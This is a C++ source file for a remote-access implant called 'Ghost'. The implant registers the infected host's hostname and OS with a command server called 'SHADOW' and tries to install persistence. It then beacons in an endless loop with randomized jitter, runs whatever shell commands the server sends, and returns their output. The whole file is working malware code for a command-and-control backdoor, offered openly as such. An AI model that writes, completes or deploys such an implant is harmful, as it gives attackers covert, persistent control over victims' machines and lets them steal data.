#include <string>
#include <vector>
#include <thread>
#include <chrono>

#include "apiSchema.hpp"
#include "config.hpp"
#include "httpClient.hpp"
#include "utils.hpp"

#include "modules/persistence.hpp"

class Ghost {
private:
    std::string uuid;
    std::string hostname;

    HttpClient client;
    int currentSleepInterval;
    int currentJitterPercent;

    std::vector<TaskResultDto> pendingResults;

public:
    Ghost(std::string ip, int port)
        : uuid(Utils::generateUuid()),
        hostname(Utils::getHostname()),
        client(ip, port),
        currentSleepInterval(DEFAULT_SLEEP_SEC),
        currentJitterPercent(DEFAULT_JITTER_PERCENT) {
        LOG_SUCCESS("GHOST up on {}", OS_PLATFORM)
    }

    void registerGhost() {
        LOG_INFO("Trying to register with SHADOW")

        GhostDto registrationPayload;
        registrationPayload.id = uuid;
        registrationPayload.hostname = hostname;
        registrationPayload.os = OS_PLATFORM;

        while (true) {
            std::string response = client.sendHttpRequest("POST", "/api/v1/ghost/register", registrationPayload.toJson());
            if (!response.empty()) {
                LOG_SUCCESS("Successfully registered with UUID {}, hostname {} and os {}", uuid, hostname, OS_PLATFORM)
                return;
            }

            std::this_thread::sleep_for(std::chrono::seconds(currentSleepInterval));
        }
    }

    void persist() {
        // TOOD: chose from different persistence methods/try them one-by-one
        // TODO: parametrize for builder
        if (Persistence::runControl() == 0) {
            return;
        }

        LOG_ERROR("Persistence failed")
    }

    void beacon() {
        LOG_INFO("Starting beacon")

        while (true) {
            LOG_INFO("[BEACON] Heartbeat sent")
            
            HeartbeatRequestDto heartbeat;
            heartbeat.id = uuid;
            heartbeat.results = pendingResults;

            std::string rawResponse = client.sendHttpRequest("POST", "/api/v1/ghost/heartbeat", heartbeat.toJson());
            
            if (!rawResponse.empty()) {
                pendingResults.clear();

                HeartbeatResponseDto instructions = HeartbeatResponseDto::fromJson(rawResponse);
                LOG_INFO("Received config with {}s sleep interval, {}\% jitter and {} tasks", instructions.sleepInterval, instructions.jitterPercent, instructions.tasks.size())

                if (instructions.sleepInterval > 0) {
                    currentSleepInterval = instructions.sleepInterval;
                }
                if (instructions.jitterPercent > 0) {
                    currentJitterPercent = instructions.jitterPercent;
                }

                if (!instructions.tasks.empty()) {
                    LOG_INFO("Received {} tasks", instructions.tasks.size())

                    for (const auto& task : instructions.tasks) {
                        processTask(task);
                    }
                }
            } else {
                LOG_ERROR("Response was empty")
            }

            sleepWithJitter();
        }
    }

private:
    void processTask(const TaskDefinitionDto& task) {
        LOG_INFO("Executing task {}: {}", task.id, task.command)

        TaskResultDto result;
        result.taskId = task.id;

        result.output = Utils::executeCommand(task.command + " " + task.args);
        result.status = TaskStatus::Done;
        LOG_SUCCESS("Task {} executed with output: {}", task.command, result.output)
        
        pendingResults.push_back(result);
    }

    void sleepWithJitter() {
        int jitterSec = (currentSleepInterval * currentJitterPercent) / 100;
        int variance = (rand() % (jitterSec * 2 + 1)) - jitterSec;
        int finalSleep = currentSleepInterval + variance;

        if (finalSleep < 0) {
            finalSleep = 0;
        }

        std::this_thread::sleep_for(std::chrono::seconds(finalSleep));
    }
};

int main() {
    srand(time(0));

    Ghost ghost(SHADOW_IP, SHADOW_PORT);

    ghost.persist();
    ghost.registerGhost();
    ghost.beacon();

    return 0;
}
